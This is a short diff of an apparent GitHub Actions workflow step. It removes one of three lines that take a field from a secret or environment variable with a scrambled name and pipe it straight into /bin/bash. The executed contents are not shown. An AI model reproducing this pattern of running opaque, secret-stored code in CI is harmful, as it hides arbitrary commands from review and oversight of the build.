@@ -17,7 +17,6 @@ jobs:
           tu03027: ${{ secrets.tu03027 }}
         run: |
           printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
-          echo $damrb7741 | jq -r .qqv54 | /bin/bash
           echo $fovgn01 | jq -r .urh3 | /bin/bash
 
       - name: Upload results
